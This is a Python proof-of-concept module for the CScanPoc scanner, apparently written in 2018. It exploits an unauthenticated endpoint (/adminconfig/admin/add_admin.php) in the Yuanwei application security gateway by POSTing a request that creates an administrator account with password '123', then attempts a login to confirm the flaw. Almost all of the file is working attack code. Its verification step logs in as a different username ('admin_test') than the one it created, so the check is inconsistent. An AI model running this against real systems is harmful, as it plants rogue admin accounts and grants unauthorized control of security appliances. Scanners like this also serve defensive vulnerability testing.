# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random


class Vuln(ABVuln):
    vuln_id = 'Yuanwei_0002'  # 平台漏洞编号，留空
    name = '远为应用安全网关 任意添加管理员'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        远为应用安全网关任意添加管理员。
        /adminconfig/admin/add_admin.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '远为应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8342fe79-4d1f-4871-843b-96c30939f523'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            add_url = arg + '/adminconfig/admin/add_admin.php'
            username = 'testvul_' + str(random.randint(111, 999))
            post = 'user_name=' + username + '&strname=&passwd=123&passwd2=123&user_desc=testvul'
            code, head, res, err, _ = hh.http(add_url, post=post)
            if (code != 200) and (code != 302):
                return False
            # 登录测试
            login_url = arg + '/post_dl.php'
            post = 'name={username}&passwd=123'.format(username='admin_test')
            header = 'Content-Type: application/x-www-form-urlencoded'
            code, head, res, err, _ = hh.http(
                login_url, post=post, header=header)
            #print '++'+res+'++'
            if (code == 200) and (res == '\r\n' or res == '\n' or res == ''):
                #security_hole('任意添加管理员：' + add_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
